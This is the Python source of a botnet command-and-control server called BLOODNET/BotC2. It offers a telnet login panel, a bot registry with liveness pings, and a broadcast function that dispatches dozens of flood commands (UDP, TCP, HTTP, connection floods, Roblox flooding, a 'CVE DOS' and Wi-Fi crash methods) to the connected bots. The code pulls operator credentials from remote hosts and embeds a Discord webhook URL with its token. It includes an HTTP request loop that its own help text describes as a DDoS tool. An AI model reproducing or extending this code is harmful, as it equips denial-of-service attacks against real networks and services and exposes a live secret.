Аfrom Commands.api import *
# Imports
import socket, threading, sys, time, ipaddress,requests
from discord_webhook import DiscordWebhook
from random import choice,choices,randint
from colorama import Fore, init, Back

OTP_WEB = "https://discord.com/api/webhooks/1077043960343691284/QrsDFlLvGoAphGA5jYouhx9ep7OGnuvD-HLOTKILvwhpRBmxbZI7wH4nkFMQLm59L6HT"
data = ""
otp_code = ''
num = 0
send_attack_target = 0

def color2(data_input_output):
    random_output = data_input_output

    if random_output == "GREEN":
        data = '\033[32m'
    elif random_output == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random_output == "YELLOW":
        data = '\033[33m'
    elif random_output == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random_output == "CYAN":
        data = '\033[36m'
    elif random_output == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random_output == "BLUE":
        data = '\033[34m'
    elif random_output == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random_output == "MAGENTA":
        data = '\033[35m'
    elif random_output == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random_output == "RED":
        data = '\033[31m'
    elif random_output == "LIGHTRED_EX":
        data = '\033[91m'
    elif random_output == "BLACK":
        data = '\033[30m'
    elif random_output == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random_output == "WHITE":
        data = '\033[37m'
    elif random_output == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data

def color():

    random2 = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
    
    random2.remove('BLACK')
    random2.remove('LIGHTBLACK_EX')

    random = choice((random2))

    if random == "GREEN":
        data = '\033[32m'
    elif random == "LIGHTGREEN_EX":
        data = '\033[92m'
    elif random == "YELLOW":
        data = '\033[33m'
    elif random == "LIGHTYELLOW_EX":
        data = '\033[93m'
    elif random == "CYAN":
        data = '\033[36m'
    elif random == "LIGHTCYAN_EX":
        data = '\033[96m'
    elif random == "BLUE":
        data = '\033[34m'
    elif random == "LIGHTBLUE_EX":
        data = '\033[94m'
    elif random == "MAGENTA":
        data = '\033[35m'
    elif random == "LIGHTMAGENTA_EX":
        data = '\033[95m'
    elif random == "RED":
        data = '\033[31m'
    elif random == "LIGHTRED_EX":
        data = '\033[91m'
    elif random == "BLACK":
        data = '\033[30m'
    elif random == "LIGHTBLACK_EX":
        data = '\033[90m'
    elif random == "WHITE":
        data = '\033[37m'
    elif random == "LIGHTWHITE_EX":
        data = '\033[97m'
    return data
user_name = ""
bots = {}

# Banners

banner_2 = f"""
 ____  _      ____   ____  _____  _   _ ______ _______ 
|  _ \| |    / __ \ / __ \|  __ \| \ | |  ____|__   __|
| |_) | |   | |  | | |  | | |  | |  \| | |__     | |   
|  _ <| |   | |  | | |  | | |  | | . ` |  __|    | |   
| |_) | |___| |__| | |__| | |__| | |\  | |____   | |   
|____/|______\____/ \____/|_____/|_| \_|______|  |_|   
                                                       
╔══════════════════════════════════════╗
  OWNER = MAYBE
╔══════════════════════════════════════╗
║ ─ ─ ─ Type HELP To Get Command ─ ─ ─ ║
╚══════════════════════════════════════╝"""

banner = f"""
 ____  _      ____   ____  _____  _   _ ______ _______ 
|  _ \| |    / __ \ / __ \|  __ \| \ | |  ____|__   __|
| |_) | |   | |  | | |  | | |  | |  \| | |__     | |   
|  _ <| |   | |  | | |  | | |  | | . ` |  __|    | |   
| |_) | |___| |__| | |__| | |__| | |\  | |____   | |   
|____/|______\____/ \____/|_____/|_| \_|______|  |_|                                                          
"""

l_banner = f"""
 ____  _      ____   ____  _____  _   _ ______ _______ 
|  _ \| |    / __ \ / __ \|  __ \| \ | |  ____|__   __|
| |_) | |   | |  | | |  | | |  | |  \| | |__     | |   
|  _ <| |   | |  | | |  | | |  | | . ` |  __|    | |   
| |_) | |___| |__| | |__| | |__| | |\  | |____   | |   
|____/|______\____/ \____/|_____/|_| \_|______|  |_|   
                                                       
MaybeNET welcomes you at home
#═════════════════════════#
  ─ ─ ─ LOGIN IN PANEL ─ ─ ─
#═════════════════════════#
"""

HINT_PASSWORD = ''

def get_location(ip_addr,GET_DATA):
    ip_address = ip_addr
    response = requests.get(f'https://ipapi.co/{ip_address}/json/').json()
    network = response.get("network")
    version = response.get("version")
    org = response.get("org")
    country_tld = response.get("country_tld")

    city = response.get("city")
    region_city = response.get("region")
    country_name = response.get("country_name")
    latitude = response.get("latitude")
    longitude = response.get("longitude")

    timezone = response.get("timezone")
    utc_offset = response.get("utc_offset")

    calling_code = response.get("country_calling_code")
    network = response.get("network")
    languages = response.get("languages")
    currency_name = response.get("currency_name")
    currency = response.get("currency")

    if GET_DATA == "IP_DATA":
        location_data = f'''
# IP DATA
IP            : {ip_address}
NETWORK       : {network}
VERSION       : {version}
ORG           : {org}
COUNTRY_TLD   : {country_tld}'''
    elif GET_DATA == "LOCATION":
        location_data = f'''
# LOCATION
CITY          : {city}
REGION        : {region_city}
COUNTRY       : {country_name}
LATITUDE      : {latitude}
LONGITUDE     : {longitude}'''
    elif GET_DATA == "TIME":
        location_data = f'''
# TIME
TIMEZONE      : {timezone}
UTC_OFFSET    : {utc_offset}'''
    elif GET_DATA == "OTHER_DATA":
        location_data = f'''
# OTHER DATA
CALLING_CODE  : {calling_code}
LANGUAGES     : {languages}
CURRYENCY     : {currency}
CURRENCY_NAME : {currency_name}'''
    elif GET_DATA == "ALL_DATA":
        location_data = f'''
# IP DATA
IP            : {ip_address}
NETWORK       : {network}
VERSION       : {version}
ORG           : {org}
COUNTRY_TLD   : {country_tld}

# LOCATION
CITY          : {city}
REGION        : {region_city}
COUNTRY       : {country_name}
LATITUDE      : {latitude}
LONGITUDE     : {longitude}

# TIME
TIMEZONE      : {timezone}
UTC_OFFSET    : {utc_offset}

# OTHER DATA
CALLING_CODE  : {calling_code}
LANGUAGES     : {languages}
CURRYENCY     : {currency}
CURRENCY_NAME : {currency_name}'''
    return location_data

def loadering(client):
    send(client, f'\33]0;\a', False)
    send(client, ansi_clear, False)
    global user_name
    data = ""
    for number in range(int(randint(1,3))):

        color_random = color()

        send(client, f'''{color_random}█▒▒▒▒▒▒▒▒▒ L _ ⏳''')
        send(client, f'\33]0;L _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}██▒▒▒▒▒▒▒▒ LO _ ⌛''')
        send(client, f'\33]0;LO _ ⏳ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}███▒▒▒▒▒▒▒ LOA _ ⏳''')
        send(client, f'\33]0;LOA _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}█████▒▒▒▒▒ LOAD _ ⌛''')
        send(client, f'\33]0;LOAD _ ⏳ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}███████▒▒▒ LOADI _ ⏳''')
        send(client, f'\33]0;LOADI _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}█████████▒ LOADIN _ ⌛''')
        send(client, f'\33]0;LOADIN _ ⏳ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)

        send(client, f'''{color_random}██████████ LOADING _ ⏳''')
        send(client, f'\33]0;LOADING _ ⌛ | BOT {len(bots)}\a', False)
        time.sleep(0.2)
        send(client, ansi_clear, False)
        data = ""
    threading.Thread(target=update_title, args=(client,user_name)).start()
TIITLE_MESSAGE = ''
DATA_TEXT = ''

message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""

help = f"""
    </>─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─</>
    ╔═════════════════════════════════════════╗
    ║ SQL_USER     ADDED NEW USER
    ║  OTP_SENT    2FA FOR ADD USER
    ║ METHODS      Shows list of attack methods all
    ║ PING_URL     Test requests to url with get methods [pls read how to use]
    ║ UPDATE_UA    Install patch update ua (pip)
    ║ URL_TO_IP    url to ip
    ║ IP_GEO       IP GEOLOCATION
    ║ SET_PROMPT   SET PROMPT TEXT INPUT
    ║ CLEAR        Clears the screen 
    ║ LOGOUT,EXIT  Disconnects from the cnc
    ╚═════════════════════════════════════════╝
    </></></></></></></></></></></></></></></>
"""

layer4 = f"""
    ╔═════════════════════════════════════════
    ║   ─ ─ ─ ─ ─ ─ Methods L4 ─ ─ ─ ─ ─ ─
    ║═════════════════════════════════════════
    ║  .udp .tcp .tup .udp_open # UDP/TCP
    ║  .rand_std .rand_hex .rand_vse .rand_all # RAND
    ║  .syn # CONNECT
    ╚═════════════════════════════════════════
"""

layer7 = f"""
    ╔═════════════════════════════════════════
    ║    ─ ─ ─ ─ ─ ─ Methods L7 ─ ─ ─ ─ ─ ─
    ║═════════════════════════════════════════
    ║  .http .cfb_sock .pyf .tls_small # HTTP SOCKETS
    ║  .http_req .http_cfb .http_dfb .http_all # HTTP REQUESTS
    ╚═════════════════════════════════════════
"""
ansi_clear = '\033[2J\033[H'

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts)

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 1 and int(time) <= 999999999999

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 0 and int(size) <= 999999999999

count_get_mysql_user_pass = 0
# Read credentials from login file
def find_login(client,username, password,username_sql):
    URL_USER_WEB_SQL = 'https://mysqlbotnet.banstendoff.repl.co/mysql_db_user.txt' 
    global count_get_mysql_user_pass
    data_loader_file_user = ""
    username_sql = username_sql
    while True:
        try:
            if username_sql == "NixC2":
                URL_USER_WEB_SQL = 'https://mysqlbotnet.banstendoff.repl.co/mysql_db_user.txt'
            elif username_sql == "BotC2":
                URL_USER_WEB_SQL = 'https://mysqlbotnet.banstendoff.repl.co/mysql_db_user.txt'
            elif username_sql == "MY_SQL":
                send(client, f'''TYPE LINK MYSQL/DB/SQL SERVICE''')
                send(client, f'''Example: https://idkwebaaaa.24etaathng.repl.co/mysql_db_user.txt''')
                send(client, f'{Fore.GREEN}    MYSQL_URL :\x1b[0m ', False, False)
                while 1:
                    URL_USER_WEB_SQL = client.recv(99999999).decode().strip()
                    if not URL_USER_WEB_SQL:
                        continue
                    break
            req = requests.get(url=URL_USER_WEB_SQL)
            print("OK . . .")
            data_loader_file_user = "OK"
        except:
            print("WAITING . . .")
            data_loader_file_user = "NO"
            count_get_mysql_user_pass += 1
        finally:
            if data_loader_file_user == "OK" or data_loader_file_user in "OK":
                break
            else:
                color_random = color()
                send(client, f'''{color_random}WAITING TO GET MYSQL . . .''')
                send(client, f"\33]0;C&C CAN'T GET MYSQL {count_get_mysql_user_pass}\a", False)
                print("TRYING . . .")
    file = open('logins.txt',"wb")
    file.write(req.content)
    file.close()
    loadering(client)
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'HI?', False, False)
                if bot.recv(65536).decode() != 'HELLO_SERVER':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

# Client handler
def handle_client(client, address):
    global num
    send(client, f'\x1b[3;31;40mBotC2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    color_random = color()
    send(client, f'{Fore.LIGHTBLUE_EX}Connection {Fore.LIGHTGREEN_EX}PUTTY {Fore.LIGHTBLUE_EX} To {Fore.LIGHTYELLOW_EX}BotC2 Servers {Fore.LIGHTMAGENTA_EX}(OK!)')
    for x in l_banner.split('\n'):
        send(client,f'{color_random}'+x)
    while 1:
        send(client, f'{Fore.GREEN}    MODE (BotC2,NixC2,MY_SQL) :\x1b[0m ', False, False) # send(client,f'{Fore.YELLOW}[MODE_TYPE] --> BotC2,NixC2,MY_SQL')
        username_sql = client.recv(99999999).decode().strip()
        if not username_sql:
            continue
        break
    while 1:
        if num == 0:
            num += 1
            send(client, f'{Fore.CYAN}    Username :\x1b[0;38;2;0;0;0m ', False, False)
        else:
            pass
        username = client.recv(99999999).decode().strip()
        if not username:
            print(username)
            continue
        break

    num = 0

    # Password Login
    password = ''
    while 1:
        send(client, f'{Fore.LIGHTBLUE_EX}    Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(99999999).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client,username, password,username_sql):
            send(client, Fore.RED + f'Invalid user or password')
            time.sleep(1)
            client.close()
            return

        global user_name
        user_name = username

        threading.Thread(target=update_title, args=(client,username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

# Updates Shell Title
def update_title(client,name):
    global send_attack_target
    try:
        send(client, f'\33]0; BLOODNET | BOTNET - [ Infect {len(bots)} | Attack-ALL {send_attack_target} | Login {name} ]  - - - [>_] WELCOME [>_]\a', False)
        time.sleep(2)
    except:
        client.close()

color_random = color()

# Telnet Command Line
def command_line(client):
    global socket_loader
    global otp_code
    global DATA_TEXT
    global TIITLE_MESSAGE
    global message_test
    loadering(client)
    color_random = color()
    for x in banner_2.split('\n'):
        send(client,f'{color_random}'+x)
        time.sleep(0.2)
    send(client,f'{color_random}')
    send(client, f"{Fore.GREEN}WELCOME TO BOTNET -> USER- {user_name} BOTS- {len(bots)} 📡")
    send(client, f"{Fore.YELLOW} OWNER = MAYBENET")
    prompt = f'{Fore.CYAN}BOT.c2 {Fore.GREEN}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(99999999).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()

            color_random = color()
            if command == 'HELP':
                loadering(client)
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                data = ""
                if len(args) == 2:
                    data = args[1]
                    color_random = color()
                    if "ALL_TOOL" in data:
                        for x in help.split('\n'):
                            send(client,f'{color_random}'+x)
                else:
                    color_random = color()
                    for x in help.split('\n'):
                            send(client,f'{color_random}'+x)
                    color_random = color()
                    send(client,f'{color_random}YOU CAN USE THIS COMMAND -->')
                    send(client,f'{color_random}HELP [MODE]')
                    send(client,f'{color_random}[MODE] --> ALL_TOOL')
            elif command == "SET_PROMPT":
                data_prompt_checker = "YES"
                prompt_code = ""
                prompt_code_color = ""
                if len(args) == 3:
                    prompt_code = args[1]
                    prompt_code_color = args[2]
                    if prompt_code == "OLD_PROMPT":
                        prompt = f'{Fore.CYAN}BOT.c2 {Fore.GREEN}$ '
                    elif prompt_code == "OLD_PROMPT2":
                        prompt = f'{Fore.CYAN}[ {Fore.MAGENTA}BotC2@{user_name} {Fore.CYAN}] {Fore.GREEN}$ '
                    elif prompt_code_color == "SHOW_COLOR":
                        random_color_all = ["GREEN","YELLOW","CYAN","BLUE","MAGENTA","RED","BLACK","WHITE","LIGHTGREEN_EX","LIGHTYELLOW_EX","LIGHTCYAN_EX","LIGHTBLUE_EX","LIGHTMAGENTA_EX","LIGHTRED_EX","LIGHTBLACK_EX","LIGHTWHITE_EX"]
                        send(client, Fore.RED + f'\x1b[3;31;40mCOLOR PROMPT -->')
                        send(client, Fore.RED + f'')
                        for color_setting_prompt in random_color_all:
                            send(client, Fore.RED + f'\x1b[3;31;40m {color_setting_prompt}')
                    else:
                        prompt = f'{color2(prompt_code_color)}{prompt_code} '
                else:
                    send(client, Fore.RED + '\x1b[3;31;40mSET_PROMPT [SET TEXT PROMPT] [COLOR] 🔧')
                    send(client, Fore.RED + '\x1b[3;31;40m')
                    send(client, Fore.RED + '\x1b[3;31;40mYOU CAN USE THIS COMMAND FOR SHOW COLOR')
                    send(client, Fore.RED + '\x1b[3;31;40mCommand --> SET_PROMPT [SET TEXT PROMPT] SHOW_COLOR 🔨')
            elif command == "SQL_USER":
                user_name_get = ""
                password_get = ""
                LINK_DB_LOAD = ''
                hints_crack = ""
                if len(args) == 5:
                    hints_crack = args[1]
                    user_name_get = args[2]
                    password_get = args[3]
                    link_db = args[4]
                    if len(otp_code) == 0:
                        send(client, f"{Fore.RED}PLS USE OTP_SENT FOR YOU CAN USE THIS COMMAND . . .")
                    elif len(user_name_get) > 2999 or len(password_get) > 2999 or user_name_get == 'BOT' or password_get == '\xff\xff\xff\xff\75':
                        send(client, f"{Fore.RED}YOU CAN'T UPLOAD USER/PASS LONG TEXT | AND CAN'T UPLOAD PASS BOT")
                    elif len(user_name_get) == 0 or len(password_get) == 0:
                        send(client, f"{Fore.RED}HEY WHY YOU NOT TYPE USER AND PASS")
                    elif otp_code == hints_crack:
                            send(client, f"{Fore.GREEN}FOUND OTP . . .")
                            if link_db == "BotC2":
                                LINK_DB_LOAD = f'https://idkwebaaaa.24etaathng.repl.co/?SQL_USER={user_name_get}&SQL_PASS={password_get}'
                            elif link_db == "NixC2":
                                LINK_DB_LOAD = f'https://nixwashere.000webhostapp.com/php_mysql.php?SQL_USER={user_name_get}:{password_get}'
                            req = requests.get(url=LINK_DB_LOAD)
                            loadering(client)
                            color_random = color()
                            for x in banner.split('\n'):
                                send(client,f'{color_random}'+x)
                                time.sleep(0.2)
                            color_random = color()
                            TIITLE_MESSAGE = 'UPLOAD USERNAME/PASSWORD TO MYSQL'
                            DATA_TEXT = f'  USER-{user_name_get} PASS-{password_get} STATUS-{req.status_code}'
                            message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""
                            for x in message_test.split('\n'):
                                send(client,f'{color_random}'+x)
                            otp_code = ''
                            time.sleep(1)
                    else:
                        send(client, f"{Fore.RED}CAN'T NOT FIND (OTP CODE) . . .")
                        time.sleep(1)
                else:
                    send(client, Fore.RED + '\x1b[3;31;40mSQL_USER [OTP_CODE] [USERNAME] [PASSWORD] [MODE-DB] <-- BotC2 NixC2')
            elif command == "PING_URL":
                url = ""
                time_loader = ''
                ps = 0
                fa_ps = 0
                if len(args) == 4:
                    url = args[1]
                    time_loader = int(args[2])
                    ok_or_no = args[3]

                    if ok_or_no == "OK" or ok_or_no == "ok":
                        loadering(client)
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        send(client, f"{Fore.GREEN}Connection load ---> {Fore.WHITE}[{Fore.RED}URL={Fore.WHITE}{url} {Fore.GREEN}TIME={Fore.WHITE}{time_loader}{Fore.WHITE}] {Fore.GREEN}(OK!)")
                        for num in range(time_loader):
                            try:
                                r = requests.get(url)
                                send(client, f"{Fore.GREEN}[{url}] ---> {Fore.YELLOW}STATUS={Fore.WHITE}{r.status_code}:{r.reason} {Fore.GREEN}PACKET={Fore.WHITE}{num}")
                                ps +=1
                            except:
                                fa_ps += 1
                                send(client, f"{Fore.GREEN}[{url}] ---> {Fore.RED}STATUS={Fore.WHITE}CAN'T CONNECT {Fore.GREEN}PACKET={Fore.WHITE}{num}")
                            finally:
                                pass
                        send(client, f"{Fore.GREEN}Connection statistics ---> {Fore.RED}Failed={Fore.WHITE}{fa_ps} {Fore.GREEN}Connected={Fore.WHITE}{ps}")
                else:
                    send(client, Fore.RED + '\x1b[3;31;40mPING_URL [URL] [TIME] [CHOICES OK OR NO]')
                    send(client, Fore.RED + "\x1b[3;31;40mHEY IF YOU DDOS/DOS TO TARGET IF STRAIGHT WEBSITE")
                    send(client, Fore.RED + "\x1b[3;31;40mITS MAKE PINGER STOP IF STOP YOU CAN CLOSE PUTTY AND NEXT OPEN AGAIN (OK)")
                    send(client, Fore.RED + "\x1b[3;31;40mNOT BUG YOU KNOW? | [BECAUSE I CAN'T FIX]")
            elif command == "URL_TO_IP":
                try:
                    url = ""
                    if len(args) == 2:
                        url = args[1]
                        host = str(url).replace("https://", "").replace("http://", "").replace("www.", "")
                        ip = socket.gethostbyname(host)
                        loadering(client)
                        color_random = color()
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        
                        color_random = color()
                        TIITLE_MESSAGE = 'URL TO IP'
                        DATA_TEXT = f' URL {url} --> IP {ip}'
                        message_test = f"""
╔═══════════════════════ [{TIITLE_MESSAGE}]
{DATA_TEXT}
╚════════════════════════"""
                        for x in message_test.split('\n'):
                            send(client,f'{color_random}'+x)
                    else:
                        send(client, Fore.RED + '\x1b[3;31;40m URL_TO_IP [URL]')
                except socket.gaierror:
                    send(client, Fore.RED + '\x1b[3;31;40m Invalid website pls check url')
            
            elif command == "IP_TO_LOCAT" or command == "IP_TO_LOCATION" or command == "IP_GEO" or command == "IP_GEOLOCATION" or command == "IP_GEOLOCAT":
                try:
                    ip = ""
                    data_get_location = ""
                    if len(args) == 3:
                        ip = str(args[1])
                        data_get_location = str(args[2])
                        ip_location = get_location(ip,data_get_location)
                        loadering(client)
                        color_random = color()
                        for x in banner.split('\n'):
                            send(client,f'{color_random}'+x)
                            time.sleep(0.2)
                        
                        color_random = color()
                        TIITLE_MESSAGE = 'IP TO LOCATION'
                        DATA_TEXT = f'{ip_location}'
                        message_test = f"""
<------ [{TIITLE_MESSAGE}] ------>
{DATA_TEXT}"""
                        for x in message_test.split('\n'):
                            send(client,f'{color_random}'+x)
                    else:
                        send(client, Fore.RED + '\x1b[3;31;40m IP_TO_GEO [IP] [DATA_GET]')
                        send(client, Fore.RED + '\x1b[3;31;40m')
                        send(client, Fore.RED + '\x1b[3;31;40mCommand in DATA_GET -->  IP_DATA  LOCATION TIME OTHER_DATA ALL_DATA')
                except socket.gaierror:
                    send(client, Fore.RED + '\x1b[3;31;40m Invalid to get data')
            elif command == 'METHODS':
                loadering(client)
                layer_get = ""
                if len(args) == 2:
                    layer_get = args[1]
                    if "LAYER4" in layer_get or "L4" in layer_get or "4" in layer_get:
                        color_random = color()
                        for x in layer4.split('\n'):
                            send(client,f'{color_random}'+x)
                    elif "LAYER7" in layer_get or "L7" in layer_get or "7" in layer_get:
                        color_random = color()
                        for x in layer7.split('\n'):
                            send(client,f'{color_random}'+x)
                else:
                    send(client, Fore.RED + '\x1b[3;31;40m Ex Command:METHODS [LAYER]')
                    send(client, Fore.RED + '\x1b[3;31;40m [LAYER] --> LAYER7,LAYER4')
            elif command == "OTP_SENT":
                hi_id = ''
                if len(args) == 2:
                    hi_id = args[1]
                    otp_code = f'{hi_id}-{random.randbytes(5)}-{random._urandom(5)}:{user_name}'
                    webhook = DiscordWebhook(url=OTP_WEB,username=f'OTP-{hi_id}:{random._urandom(5)}:{user_name}',content=f'OTP --> {otp_code}')
                    response = webhook.execute()
                    send(client, Fore.GREEN + f' [OTP_USER] OTP-{hi_id}:{random._urandom(5)}:{user_name} <-- YOU CAN FOUND THIS NAME USER IN MY DISCORD SERVER')
                else:
                    send(client, Fore.RED + '\x1b[3;31;40m OTP_SENT [ID] <-- ID = YOU CAN TYPE RANDOM NAME ')
            elif command == 'CLEAR' or command== "CLS":
                loadering(client)
                send(client, ansi_clear, False)
                color_random = color()
                for x in banner_2.split('\n'):
                    send(client, f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f"{Fore.GREEN}WELCOME TO BOTNET.CNC -> USER-{user_name} BOTNET-{len(bots)} 📡")
                send(client, f"{Fore.YELLOW} credit: NixWasHere/NixC2 OWNER code")
            elif command == 'LOGOUT' or command == "EXIT":
                color_random = color()
                for x in banner.split('\n'):
                    send(client,f'{color_random}'+x)
                    time.sleep(0.2)
                send(client, f'{Fore.LIGHTMAGENTA_EX}Successfully Logged out | credit: NixWasHere/NixC2 OWNER code\n')
                time.sleep(1)
                break
            elif command == '.HTTP_MIX': # http Junk
                http_3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HTTP_PPS': # http pps
                http_pps(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.ROBLOX_1': # ROBLOX FLOODING
                roblox_flooding(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.ROBLOX_2': # ROBLOX FLOODING
                roblox_flooding2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.ROBLOX_ALL': # ROBLOX FLOODING
                roblox_flooding3(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.UDP': # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.UDP_ALL': # UDP Junk (Random UDP Data)
                udp_all(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TCP_ALL': # TCP Junk (Random TCP Data)
                tcp_all(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.UDP_PYBOT': # UDP Junk (Random UDP Data)
                udp_pybot(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.UDP_BYPASS': # UDP Junk (Random UDP Data)
                udp_bypass(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_OLD': # TUP Junk (Random UDP/TCP Data)
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_BYPASS': # TUP Junk (Random UDP/TCP Data)
                tup2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_PYBOT3': # TUP Junk (Random UDP/TCP Data)
                tup_pybot3(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_PYBOT2': # TUP Junk (Random UDP/TCP Data)
                tup_pybot2(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_PYBOT': # TUP Junk (Random UDP/TCP Data)
                tup_pybot(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_NEW': # TUP Junk (Random UDP/TCP Data)
                tup3(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_NEW2': # TUP Junk (Random UDP/TCP Data)
                tup4(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.TUP_NEW3': # TUP Junk (Random UDP/TCP Data)
                tup5(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
            elif command == '.CC': # Connection flood
                cc(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC2': # Connection flood
                cc2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC3': # Connection flood
                cc3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC4': # Connection flood
                cc4(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CC5': # Connection flood
                cc5(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.NDS': # Connection flood but no data in packet
                NDS(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.HSCD': # EXPLOIT CVE DOS
                HSCD(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent3, broadcast, data)
            elif command == '.WIFI_RESOURCES': # Make ping test to get No resources,Timeout or ping get high ms
                wifi_crash(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.WIFI_UNREACHABLE': # Make ping test to get Destination net unreachable
                wifi_crash2(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.WIFI_REUN':
                wifi_crash3(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.CUSTOM_PACKET': # CUSTOM PACKET
                custom_packet_attack(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, attack_sent1, broadcast, data)
            elif command == '.TCP': # TCP Junk (Random TCP Data)
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, attack_sent2, broadcast, data)
